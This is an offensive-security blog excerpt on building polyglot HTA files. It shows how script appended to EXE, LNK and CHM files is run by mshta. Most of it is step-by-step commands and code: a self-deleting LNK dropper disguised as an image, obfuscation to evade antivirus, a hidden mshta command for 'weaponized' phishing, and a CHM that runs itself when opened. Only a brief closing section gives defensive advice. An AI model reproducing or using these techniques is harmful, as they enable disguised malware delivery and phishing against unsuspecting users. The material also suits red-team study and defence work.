1. https://blog.sevagas.com/?Hacking-around-HTA-files#:~:text=III.%20Polyglot%20HTA%20file

Polyglot HTA file
It is easy to build files which are both valid when opened with MSHTA and other applications, and unlike polyglot wizardry you see from Ange Albertini in PoC, these files are really easy to build!

1) Polyglot HTA/PE file
We are going to test our assumption on an executable file (.exe extension)
```
copy /b %windir%\system32\calc.exe+test.hta calc2.exe
 calc2.exe  -> Runs good old calc
 mshta %cd%\calc2.exe  -> Execute HTA script!
```
So you can hide and run Visual Basic script in an executable binary!

Exercice: Create an executable which calls itself with MSHTA to run the appended script.
Exercice (advanced): Patch an existing executable with shellcode and HTA so that execution will run mshta.exe to execute the HTA script.
2) Polyglot HTA/LNK file
What is a MS windows shortcut (.lnk extension)?

Well basically Its a binary file which executes a command when you double click on it.

For now lets focus on the part "its a binary". As we saw previously, mshta.exe will find and execute HTA scripts inside a binary.

Lets check that LNK file can be turned into polyglot HTA script.
This is how it’s done:

First, create a shortcut (to a readme.txt file in the example)
Next append HTA to the LNK file
```
copy /b readme.txt.lnk+test.hta readme2.txt.lnk
```
If you double click on shortcut, it will resolve and open the txt file.
But if you use MSHTA:
```
mshta %cd%\readme.txt.lnk -> Executes HTA script!
```

3) Other HTA polyglots
I hope you see where we are going ^^, but first, an easy polyglot exercise for the reader!

Exercise: Make a shortcut to an image that is also an HTA script and a zip file To prove it you must show that:
You can extract the shortcut file with unzip/7zip
You can run the HTA part with mshta.exe
You open the image if your double-click on the shortcut
It’s really easy!

HTA without .hta extension
1) What to do with malicious LNK file?
There is a history of LNK file used by APT and malware as an alternative to malicious Office documents. This is because of the second part of windows shortcuts short definition:
Its a binary file which executes a command when you double click on it.

This article on blog.trendmicro describes various attacks relying on malicious LNK files.
Some of the attack scenarios done by APT:
```
LNK -> CMD -> Powershell -> DROP RAT
LNK -> remote SCT -> DROP RAT
DOCx -> LNK -> remote HTA -> Powershell -> DROP RAT
```
I think these APT guys do not have a lot of imagination. Instead of calling an HTA or SCT file over the Internet, why not just turn the LNK itself into an HTA application?
In fact, you can modify the LNK target in a way it will use MSHTA on itself and thus, execute the script.
That basically turns an LNK file into a self executable HTA file with a non .hta extension.

Before that, a simple polyglot exercise which does not involve HTA:

Exercise: Create a file which is both a ZIP file and LNK file (with .lnk extension). The goal is to extract the zip archive when you double click on the shortcut (without any HTA code).
IV.2) The magical picture trick!
If we combine everything it is possible to have phishing, cmd execution, HTA script, and dropped payload all in one file and without any access to the Internet!

Here is how it works:
Lets demonstrate that with a Magic trick!
Initial condition:

You have one single shortcut in a folder,
You have no internet access
The shortcut is the only file on the folder
No knowledge of anything else on the computer except it’s a windows OS.
The play:

Double click on the shortcut ==> A picture will be displayed!
When you close the picture window, the shortcut is gone and replaced by the picture file!!!
OK how to make this proof of concept: .

0) Get a picture, lets call it magic.png

1) Generate HTA dropper with macro_pack
```
echo "magic.jpg" | macro_pack.exe -t EMBED_EXE -e magic.jpg -o -G magic_dropper.hta
```
The EMBED_EXE template combined with -e option will embed the given file inside the HTA code.
At execution, the HTA code will drop the file, and execute it (which for a jpg file results in it being opened in the default image viewer).

Note: -o option is for obfuscation to prevent some annoying AV yelling.

2) Add self destruct routine
Edit magic_dropper.hta, go to the end of the file and add the next code between calls to "autoopen" and "close"
```
Set objFSO = CreateObject( "Scripting.FileSystemObject" )
Set WshShell = CreateObject("WScript.Shell") 
objFSO.DeleteFile window.document.location.pathname
```
Now the HTA file will delete itself after running.

2) Create magic.jpg.lnk LNK file
Create a shortcut (manually if you want) and call it magic.jpg in explorer (so its real name is magic.jpg.lnk)

3) Configure LNK file

Right click on LNK to modify its properties.
As a target we could use:
```
%windir%\System32\mshta.exe <fullpath>\magic.jpg.lnk
```
But it’s less versatile and we do not know the file path where the shortcut will be executed for your demo.

Lets rather use cmd:
```
%windir%\system32\cmd.exe /c start "" "mshta" "%CD%\magic.jpg.lnk"
```
Next, change the LNK icon to something related to an image (find one or just use an icon in %windir%\system32\shell32.dll).

4) Append HTA to link for polyglot magic
```
copy /b magic.jpg.lnk+magic_dropper.hta magic.jpg.lnk
```
Your magic demo is ready, put the LNK anywhere on another PC and double click on the symlink :)

If you want to a more "weaponized" phishing application around HTA and LNK, you can "obfuscate" the shortcut command by using something like:
```
%windir%\system32\cmd.exe /c start "" "mshta" "%CD%\lol.magic.lnk"          E:\web_content\index_files\magic.png
```
This will hide the mshta part to someone who looks at the LNK parameters

3) The polyglot help file trick
So we saw we could run an HTA file disguised as a shortcut, now lets do the same with a help file (.chm)!
A help file can be build with Microsoft HTML Help Workshop
To build a CHM file, first you need an HTML help project (.hhp) file which is a text configuration file. See msdn for more information.
Here is an example of .hpp file:
```
[OPTIONS]
Compatibility=1.1 or later
Compiled file=hello.chm
Default topic=hello.htm
Display compile progress=No
Language=0x410 Italian (Italy)


[FILES]
hello.htm

[INFOTYPES]
The file contains various configuration settings. hello.chm will be the name of the created help file. The HTML source file which will be used is "hello.htm"
```

Here is the content of the hello.htm file:
```
<html>
<title> Hello World! </title>
<head>
</head>
<body>

<OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",cmd,/c mshta %CD%\hello.chm">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
shortcut.Click();
</SCRIPT>

<h2 align=center> CHM Example </h2>
<p><h3 align=center> This is a malicious CHM file </h3></p>
</body>
</html
```
This file contains a shortcut which will call the command cmd /c mshta %CD%\hello.chm. This shortcut is automatically triggered when the file is opened. This means the help file will run MSHTA on itself when it is opened :)

Next generate the CHM file. You can do that in "HTML Help Workshop" (File->Compile).

To finalize the attack, lets append an HTA file to our generate help file:
```
copy /b hello.chm+hello.hta hello.chm
```
Now double click on your help file to check it worked!

4) Other self calling HTA
All binary file format which can be used to start a command line can be turned into a vaild autonomous HTA script.

Exercise: Make a MS Excel file with DDE field which calls MSHTA on itself to run an appended HTA script.
Final toughs
How to avoid malicious usage of polyglot HTA?
This "feature" could be prevented by requiring to have an HTA tag starting at the beginning of the file. One problem for example is this would break compatibility with all current HTA which relies on images.
It is important to notice that attacking via malicious CHM, LNK, or HTA files is nothing new. But these formats are generally overlooked in security awareness trainings.

Malicious LNK files in emails are generally flagged as SPAM/malware, but they can be very dangerous on a USB key, embedded in an Office document, or inside a ZIP file. CHM file is less likely to be considered malicious and same for other potential dangerous formats.

For blue teams: Usually, if you don’t rely on HTA files, it is recommended to either disable all mshta binaries using application whitelisting or to link the .hta extension to notepad. This article showed that disabling .hta extension does not work.



